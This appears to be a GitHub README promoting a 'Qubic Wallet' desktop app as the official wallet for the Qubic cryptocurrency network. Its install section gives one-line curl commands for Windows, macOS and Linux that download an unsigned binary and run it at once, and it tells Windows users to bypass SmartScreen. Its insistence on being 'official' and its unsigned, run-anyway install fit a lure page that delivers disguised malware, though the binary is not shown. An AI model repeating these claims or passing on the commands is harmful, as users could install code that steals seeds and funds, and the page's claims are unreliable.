![What is Qubic Wallet](assets/banner-brand.png)

# What Is Qubic Wallet and What Does It Actually Do?

The official Qubic desktop wallet: local keys, nine assets, and no server account.

## Downloads - v0.8.2

<p align="center"><a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform windows"> | Windows 10 (1909) or later, 64-bit | [`qubic-wallet-desktop-v0.8.2-windows.exe`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe) - 57,942,724 B (55.3 MiB) |
| <img src="assets/platform-macos.svg" alt="platform macos"> | macOS 12 or later | [`qubic-wallet-desktop-v0.8.2-osx-arm64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip) - 49,066,728 B (46.8 MiB) |
| <img src="assets/platform-linux.svg" alt="platform linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`qubic-wallet-desktop-v0.8.2-linux-x64.zip`](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip) - 51,287,539 B (48.9 MiB) |

Everything below is read from the [current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2), its repository and its client constants.

> It is a wallet, not an account. Nothing about it lives on a server.

Qubic Wallet is the official Qubic desktop wallet for the Qubic network, published by the Qubic Wallet organisation from the `qubic-wallet/qubic-desktop-wallet` repository. It holds QU and eight smart-contract assets, keeps your encrypted account in a folder on your own machine, and talks to the network directly. There is no email, no registration and no server-side account to log into.

<!-- ARTICLE-BODY-BEGIN -->

## What it is

An Electron application with a local Express server and a React interface, built from a wasm module that compiles from the C sources in the same repository. It runs on Windows, macOS and Linux, and it is distributed as a signed-nothing build you verify by hash.

## The account model

One password, one account. The password generates the seed - 55 lowercase characters if it starts with `Q`, a 24-word BIP39 phrase otherwise - encrypts it, and names the file it lives in. Login hashes what you type and opens the matching file, which is why a typo opens a different, empty account instead of failing.

The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-seed-phrase-format.md">seed format guide</a> covers what to write down and what to never type into a website.

## What it can do

Send and receive QU and the assets in its list, show balances and history, trade on QX through a built-in order book, switch between mainnet and testnet, and auto-lock after a timeout you choose. Keys stay local; seeds are scrubbed from memory after use.

## What it cannot do

Staking, MSVault multi-signature, batch sending and watch-only accounts have no code in this build, whatever older pages say. Hardware wallet support is absent too. Those are four separate questions answered honestly rather than four missing menu items.

## Where it sits among the alternatives

It is one of three shapes: this desktop app, a browser-based wallet, and a phone app that has code but no published build. The <a href="https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-desktop-vs-web-wallet.md">desktop and web comparison</a> covers the trade.

The <a href="https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md">download and verification page</a> is where to start if you have decided.

Everything above describes the <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2">current Qubic Wallet release</a>; a build older than that can differ in screens and endpoints.

## FAQ

### Is this the official Qubic wallet?

Yes. This is the official Qubic Wallet.

### Does it hold QU?

Yes, plus eight smart-contract assets in its shipped list.

### Do I need an account on a website?

No. There is no registration, and the wallet works offline for everything except network reads.

### Is there a mobile version?

The code exists; no mobile build is published.

### Can I recover it if I forget the password?

Not without the password. Nothing on a server knows the account exists.

### Does it support staking or multisig?

No. Neither has code in this build.

<!-- ARTICLE-BODY-END -->

## How to install Qubic Wallet

<!-- INSTALL-BEGIN: D11. Windows ships one .exe; macOS and Linux ship .zip archives holding the executable and its checksum file. Two checksum levels: the download itself, then the .Wallet binary inside the archive. -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-windows.exe">qubic-wallet-desktop-v0.8.2-windows.exe</a>.
2. Verify the download before running it (PowerShell): `Get-FileHash .\setup.exe -Algorithm SHA256`
3. Open the downloaded file.
4. If SmartScreen appears, choose More info, then Run anyway.
5. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet && ./qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-arm64.zip">qubic-wallet-desktop-v0.8.2-osx-arm64.zip</a> for Apple silicon, or <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-osx-x64.zip">qubic-wallet-desktop-v0.8.2-osx-x64.zip</a> for an Intel Mac.
2. Verify the download: `shasum -a 256 wallet.zip`
3. Extract the archive; it contains the executable, an icon and a checksum file.
4. Open Terminal in the extracted folder and run `chmod +x` on the `.Wallet` file.
5. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop.sha256` then `shasum -a 256 qubic-wallet-desktop-v0.8.2-osx-arm64/qubic-wallet-desktop-v0.8.2-osx-arm64.Wallet`
6. Run that file; if macOS blocks the first launch, allow it under System Settings, Privacy and Security.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip && unzip -o wallet.zip && chmod +x qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet && ./qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet
```

Manual install:
1. Download <a href="https://github.com/qubic-wallet/qubic-desktop-wallet/releases/latest/download/qubic-wallet-desktop-v0.8.2-linux-x64.zip">qubic-wallet-desktop-v0.8.2-linux-x64.zip</a>.
2. Verify the download: `sha256sum wallet.zip`
3. Extract the archive.
4. Verify the binary against the checksum file inside the archive: `cat qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop.sha256` then `sha256sum qubic-wallet-desktop-v0.8.2-linux-x64/qubic-wallet-desktop-v0.8.2-linux-x64.Wallet`
5. Mark the `.Wallet` file executable.
6. Run it.

### Published SHA-256 values (upload of 2026-11-22)

| File | Download-level SHA-256 |
| --- | --- |
| `qubic-wallet-desktop-v0.8.2-windows.exe` | `eb8b377ecf884da5932d3721e428823ed2787c061cc3ae3d3afaedc8d8593815` |
| `qubic-wallet-desktop-v0.8.2-osx-arm64.zip` | `8f4414a987a328fd1a75012b4c6a84fc10bc269df58ceb08104fe8c008815c81` |
| `qubic-wallet-desktop-v0.8.2-osx-x64.zip` | `923915b18899a03f7ba5685ec653102c74293d83aa078ffa9961db4c62990cd4` |
| `qubic-wallet-desktop-v0.8.2-linux-x64.zip` | `682d4dc414804fe3359f8e91d370f689aef99f3e82cecc382fd87180269cc9fc` |

Compare the value your command prints with the row for the file you downloaded. The second check reads the `.sha256` file shipped inside the archive, which hashes the extracted `.Wallet` binary and names it `qubic-wallet-desktop`; compare the two hashes by eye rather than running the file as a checklist, because the stored name is not the extracted file name. A mismatch at either level means stop: delete the file and download again from this repository's release page.
<!-- INSTALL-END -->

## Related guides

- [Download and verify](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-download-verify-installer.md)
- [Seed phrase formats](https://github.com/qubic-wallet/qubic-wallet-setup/blob/main/qubic-wallet-seed-phrase-format.md)
- [Desktop wallet vs web wallet](https://github.com/qubic-wallet/qubic-wallet-trust/blob/main/qubic-wallet-desktop-vs-web-wallet.md)
- [Current Qubic Wallet release](https://github.com/qubic-wallet/qubic-desktop-wallet/releases/tag/v0.8.2)
